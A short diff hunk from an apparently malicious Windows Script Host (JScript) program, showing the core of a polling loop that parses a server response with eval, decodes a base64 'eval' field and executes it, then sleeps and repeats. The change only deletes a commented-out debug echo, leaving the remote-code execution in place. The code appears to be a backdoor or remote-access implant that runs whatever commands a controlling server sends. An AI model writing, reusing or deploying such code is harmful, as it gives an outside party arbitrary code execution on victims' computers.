@@ -47,7 +47,6 @@ while(true){
   json_data = "{" + resp.substring(start+1, end) + "}"
   eval("command = " + json_data)
   if(command.eval){
-    //WScript.echo(base64_decode(command.eval))
     eval(base64_decode(command.eval));
   }
   WScript.Sleep('3000')
